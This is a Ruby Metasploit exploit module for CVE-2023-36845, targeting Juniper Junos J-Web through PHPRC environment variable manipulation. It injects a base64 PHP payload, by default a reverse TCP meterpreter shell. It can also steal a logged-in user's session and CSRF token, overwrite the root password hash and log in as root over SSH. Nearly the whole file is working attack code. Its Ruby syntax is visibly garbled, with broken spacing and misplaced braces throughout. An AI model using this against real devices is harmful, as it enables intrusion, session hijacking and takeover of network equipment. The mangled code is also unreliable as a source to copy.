<##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

    require 'unix_crypt'
require 'net/ssh'
require 'net/ssh/command_stream'

class MetasploitModule<Msf:: Exploit:: Remote
  Rank = ExcellentRanking

  include Msf:: Exploit:: Remote:: HttpClient
  include Msf:: Exploit:: CmdStager
  include Msf:: Exploit:: Remote:: SSH

  prepend Msf:: Exploit:: Remote:: AutoCheck

  def initialize(info = {})
super(
    update_info(
        info,
        'Name' => 'Junos OS PHPRC Environment Variable Manipulation RCE',
        'Description' => % q{
            This module exploits a PHP environment variable manipulation vulnerability affecting Juniper SRX firewalls
          and EX switches.The affected Juniper devices run FreeBSD and every FreeBSD process can access their stdin
          by opening / dev / fd / 0. The exploit also makes use of two useful PHP features.The first being
          'auto_prepend_file' which causes the provided file to be added using the 'require' function.The second PHP
          function is 'allow_url_include' which allows the use of URL - aware fopen wrappers.By enabling
          allow_url_include, the exploit can use any protocol wrapper with auto_prepend_file.The module then uses
data:// to provide a file inline which includes the base64 encoded PHP payload.

          By default this exploit returns a session confined to a FreeBSD jail with limited functionality.There is a
          datastore option 'JAIL_BREAK', that when set to true, will steal the necessary tokens from a user authenticated
          to the J - Web application, in order to overwrite the the root password hash.If there is no user
          authenticated to the J - Web application this method will not work.The module then authenticates
with the new root password over SSH and then rewrites the original root password hash to / etc / master.passwd.
        },
'Author' => [
    'Jacob Baines',  # Analysis
          'Ron Bowes',     # Jail break technique + Target setup instructions
'jheysel-r7'     # Msf module
        ],
'References' => [
    ['URL', 'https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/'],
    ['URL', 'https://vulncheck.com/blog/juniper-cve-2023-36845'],
    ['URL', 'https://supportportal.juniper.net/s/article/2023-08-Out-of-Cycle-Security-Bulletin-Junos-OS-SRX-Series-and-EX-Series-Multiple-vulnerabilities-in-J-Web-can-be-combined-to-allow-a-preAuth-Remote-Code-Execution?language=en_US'],
    ['CVE', '2023-36845']
],
    'License' => MSF_LICENSE,
        'Platform' => % w[php unix],
'Privileged' => false,
    'Arch' => [ARCH_PHP, ARCH_CMD],
        'Targets' => [
            [
                'PHP In-Memory',
                {
                    'Platform' => 'php',
                    'Arch' => ARCH_PHP,
                    'Type' => : php_memory,
                    'DefaultOptions' => {
                        'PAYLOAD' => 'php/meterpreter/reverse_tcp',
                            'RPORT' => 80
                    }
                },
            ],
            [
                'Interactive SSH with jail break',
                {
                    'Arch' => ARCH_CMD,
                    'Platform' => 'unix',
                    'Type' => : nix_stream,
                    'DefaultOptions' => {
                        'PAYLOAD' => 'cmd/unix/interact',
                            'WfsDelay' => 30
                    },
                    'Payload' => {
                        'Compat' => {
                            'PayloadType' => 'cmd_interact',
                                'ConnectionType' => 'find'
                        }
                    }
                }
            ]

        ],
            'DefaultTarget' => 0,
                'DisclosureDate' => '2023-08-17',
                    'Notes' => {
    'Stability' => [CRASH_SAFE,],
        'SideEffects' => [CONFIG_CHANGES],
            'Reliability' => [REPEATABLE_SESSION,]
}
      )
    )

register_options([
    OptString.new('TMP_ROOT_PASSWORD', [true, 'If target is set to "Interactive SSH with jail break", the root user\'s password will be temporarily changed to this password', rand_text_alphanumeric(24)]),
    OptPort.new('SSH_PORT', [true, 'SSH port of Junos Target', 22]),
    OptInt.new('SSH_TIMEOUT', [true, 'The maximum acceptable amount of time to negotiate a SSH session', 30])
])
end

  def check
non_existent_file = rand_text_alphanumeric(8..16)
res = send_request_cgi(
    'uri' => normalize_uri(target_uri.path),
    'method' => 'POST',
    'ctype' => 'application/x-www-form-urlencoded',
    'data' => "LD_PRELOAD=/tmp/#{non_existent_file}"
)

return CheckCode:: Appears('Environment variable manipulation succeeded indicating this target is vulnerable.') if res && res.body.include ? ("Cannot open \"/tmp/#{non_existent_file}\"")

    CheckCode:: Safe('Environment variable manipulation failed indicating this target is not vulnerable.')
end

  def send_php_exploit(phprc, file_contents)
post_data = "allow_url_include=1\n"
post_data << "auto_prepend_file=\"data://text/plain;base64,#{Rex::Text.encode_base64(file_contents)}\""
send_request_cgi(
    'uri' => normalize_uri(target_uri.path),
    'method' => 'POST',
    'data' => post_data,
    'ctype' => 'application/x-www-form-urlencoded',
    'vars_get' => {
    'PHPRC' => phprc
}
)
end

  def get_php_session_id
get_var_sess = "<?php print_r(scandir('/var/sess'));?>"
res = send_php_exploit('/dev/fd/0', get_var_sess)

fail_with(Failure:: Unreachable, "#{peer} - Could not connect to the web service") if res.nil ?
    fail_with(Failure:: UnexpectedReply, "#{peer} - Unexpected response (response code: #{res.code})") unless res.code == 200

php_session_id = res.body.scan(/\[\d+\] => sess_(.*)/).flatten[0]

fail_with(Failure:: UnexpectedReply, "Failed to retrieve a PHP Session ID. There might not be a user logged in at the moment which would cause this to fail.\n Try setting JAIL_BREAK to false to in order to get a session as the 'nobody' user. Or try again when a there is a user authenticated to the J-Web application.") unless php_session_id
print_status("Found PHPSESSID: #{php_session_id}.")
php_session_id
end

  def get_csrf_token(php_session_id)
res = send_request_cgi(
    'uri' => normalize_uri(target_uri.path, 'diagnose'),
    'method' => 'GET',
    'headers' =>
    {
        'Cookie' => "PHPSESSID=#{php_session_id}"
    },
    'vars_get' => {
    'm[]' => 'pinghost'
}
)

fail_with(Failure:: Unreachable, "#{peer} - Could not connect to the web service") if res.nil ?
    fail_with(Failure:: UnexpectedReply, "#{peer} - Unexpected response (response code: #{res.code})") unless res.code == 200

csrf_token = res.get_html_document.xpath("//input[@type='hidden' and @name='csrf_token']/@value").text
fail_with(Failure:: UnexpectedReply, 'Unable to retrieve a csrf token') unless csrf_token
print_status("Found csrf token: #{csrf_token}.")
csrf_token
end

  def get_encrypted_root_password(php_session_id, csrf_token)
post_data = "rs=get_cli_data&rsargs[]=getQuery&csrf_token=#{csrf_token}&key=1"

res = send_request_cgi(
    'uri' => normalize_uri(target_uri.path, 'jsdm', 'ajax', 'cli-editor.php'),
    'method' => 'POST',
    'data' => post_data,
    'ctype' => 'application/x-www-form-urlencoded',
    'headers' =>
    {
        'Cookie' => "PHPSESSID=#{php_session_id}"
    }
)

fail_with(Failure:: Unreachable, "#{peer} - Could not connect to the web service") if res.nil ?
    fail_with(Failure:: UnexpectedReply, "#{peer} - Unexpected response (response code: #{res.code})") unless res.code == 200

    # The body of the above request is formatted like so:

    ## Last changed: 2023 -09 - 25 13:00: 49 UTC
    # version 20200609.165031.6_builder.r1115480;
    # system {
    #   host - name JUNOS;
    #   root - authentication {
    #     encrypted - password "$6$yMwZY.o0$WwCZgzN7FTDfhSvkum0y9ry/nu4yWOQcgW.JJz0vJapf5P6XHoCsigsz94oEKSPO5efKFP/JhhN3/FCKvB0Hp.";
    #
    }
    #   login {
    #     user admin {
    #       uid 2000;
    #       class super- user;
    #       authentication {
    #         encrypted - password "$6$65gs/MrK$DNpVWfIocQ.rG/ThjZXjRI/yha/lf1UImNKivq.T1K4yLW60PWFrcQakoP6mwHT9Cr3xQZZfomKSTRXWl2aWj1";
    #
            }
    #
        }

        fail_with(Failure:: UnexpectedReply, 'ssh root-login is not permitted on the device thus the module will not be able to establish a session or restore the original root password.') unless res.body.scan(/"ssh\s+\{\n\s+root-login\s+allow;"/)
    # Multiple passwords are displayed in the output, ensure we grab the encrypted - password that belongs to the
    # root - authentication configuration with the following regex:
        og_encrypted_root_pass = res.body.scan(/root-authentication\s+\{\n\s+encrypted-password\s+"(.+)"/).flatten[0]
        fail_with(Failure:: UnexpectedReply, 'Unable to retrieve the encrypted root password from the response') unless og_encrypted_root_pass

        print_status("Original encrypted root password: #{og_encrypted_root_pass}")
        og_encrypted_root_pass
        end

  def set_root_password(php_session_id, csrf_token, password_hash)
        post_data = "&current-path=/system/root-authentication/&csrf_token=#{csrf_token}&key=1&JTK-FIELD-encrypted-password=#{password_hash}"
        res = send_request_cgi(
            'uri' => normalize_uri(target_uri.path, 'editor', 'edit', 'configuration', 'system', 'root-authentication'),
            'method' => 'POST',
            'data' => post_data,
            'ctype' => 'application/x-www-form-urlencoded',
            'headers' =>
            {
                'Cookie' => "PHPSESSID=#{php_session_id}"
            },
            'vars_get' => {
            'action' => 'commit'
        }
        )

        fail_with(Failure:: Unreachable, "#{peer} - Could not connect to the web service") if res.nil ?
            fail_with(Failure:: UnexpectedReply, "#{peer} - Unexpected response (response code: #{res.code})") unless res.code == 200

    unless res.get_html_document.xpath("//body/div[@class='commit-status' and @id='systest-commit-status-div']").text == 'Success'
        fail_with(Failure:: UnexpectedReply, "#{peer} - Unexpected response (response code: #{res.code})")
        end
        print_status("Successfully changed the root user's password ")
        end

  def ssh_login
        ssh_opts = ssh_client_defaults.merge({
            port: datastore['SSH_PORT'],
            auth_methods: ['password'],
            password: datastore['TMP_ROOT_PASSWORD']
        })

        begin
        ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
            Net:: SSH.start(rhost, 'root', ssh_opts)
      end
    rescue Net:: SSH:: Exception => e
        vprint_error("#{e.class}: #{e.message}")
        return nil
        end

        if ssh
      Net:: SSH:: CommandStream.new(ssh)
        end
        end

  def exploit
    case target['Type']
        when: nix_stream
        print_status("Attempting to break out of FreeBSD jail by changing the root user's password, establishing an SSH session and then rewriting the original root user's password hash to /etc/master.passwd.")
        print_warning("This requires a user is authenticated to the J-Web application in order to steal a session token, also 'ssh root-login' is set to 'allow' on the device")
        php_session_id = get_php_session_id
        csrf_token = get_csrf_token(php_session_id)
        @og_encrypted_root_pass = get_encrypted_root_password(php_session_id, csrf_token)
        tmp_password_hash = UnixCrypt:: SHA512.build(datastore['TMP_ROOT_PASSWORD'])
      print_status "Temporary root password Hash: #{tmp_password_hash}"
        set_root_password(php_session_id, csrf_token, tmp_password_hash)

        if (ssh = ssh_login)
            print_good('Logged in as root')
        handler(ssh.lsock)
        end

        set_root_password(php_session_id, csrf_token, @og_encrypted_root_pass)

        when: php_memory
        send_php_exploit('/dev/fd/0', payload.encoded)
    else
        fail_with(Failure:: BadConfig, 'Please select a valid target.')
        end
        end